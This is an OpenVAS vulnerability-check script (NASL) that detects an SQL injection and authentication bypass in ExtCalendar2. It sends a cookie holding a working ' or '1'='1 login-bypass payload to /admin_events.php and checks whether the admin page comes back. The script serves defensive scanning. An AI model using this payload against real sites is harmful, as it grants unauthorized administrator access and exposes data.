###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_extcalender_sql_inj_n_auth_bypass_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# ExtCalendar2 SQL Injection and Authentcation Bypass Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902772");
  script_version("$Revision: 13660 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"creation_date", value:"2011-12-19 16:39:11 +0530 (Mon, 19 Dec 2011)");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_name("ExtCalendar2 SQL Injection and Authentcation Bypass Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17562/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103274/extcalendar2bypass-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to gain the
  administrator privileges and sensitive information.");

  script_tag(name:"affected", value:"ExtCalendar2");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  passed via the cookie to '/admin_events.php'.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is ExtCalendar2 and is prone to sql injection and
  authentcation bypass vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir (make_list_unique("/ext", "/calendar", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/calendar.php", port:port);

  if(">Powered by" >< rcvRes || ">ExtCalendar" >< rcvRes)
  {
    filename = dir + "/admin_events.php";
    exp = "ext20_username=admin ' or '1'= '1; " +
          "ext20_password=admin ' or '1'= '1";
    sndReq2 = string( "GET ", filename, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: ", http_get_user_agent(), "\r\n",
                      "Cookie: ", exp, "\r\n\r\n");

    rcvRes2 = http_keepalive_send_recv(port:port, data:sndReq2);

    if(">Event Administration<" >< rcvRes2 && ">Logout" >< rcvRes2)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
